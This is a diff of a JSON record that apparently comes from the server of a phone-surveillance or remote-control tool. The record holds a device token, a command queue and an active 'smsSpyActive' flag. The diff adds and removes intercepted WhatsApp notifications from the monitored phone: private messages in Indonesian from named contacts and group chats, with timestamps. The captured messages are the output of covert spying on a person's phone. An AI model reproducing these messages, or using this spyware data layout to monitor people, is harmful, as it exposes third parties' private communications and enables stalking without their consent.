@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-CA6D",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "1505d9de1a287ae732b4f22d45e58506",
-    "lastSeen": 1777173685892,
+    "lastSeen": 1777173688988,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T03:08:43.334Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "jas",
+        "content": "dapet salam dari mantan",
+        "time": "26/04 11:32",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777173690061
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎1248 pesan dari 19 chat",
+        "time": "26/04 11:32",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777173686821
+      },
       {
         "appName": "WhatsApp",
         "sender": "jas",
@@ -4003,22 +4019,6 @@
         "time": "26/04 11:20",
         "pkg": "com.whatsapp",
         "receivedAt": 1777172947657
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝐒𝐓𝐌 𝐒𝐔𝐒𝐔 𝐃𝐀𝐍𝐂𝐀𝐖𝟕𝟕𝟕 ᵛ¹ (173 pesan): ~ N1f.",
-        "content": "Awas ntar klarifikasi",
-        "time": "26/04 11:20",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777172947651
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎TWOSTROKE JATIM V1 (17 pesan): ~ ocong",
-        "content": "IP XR",
-        "time": "26/04 11:20",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777172947649
       }
     ],
     "galleryPhotos": [],
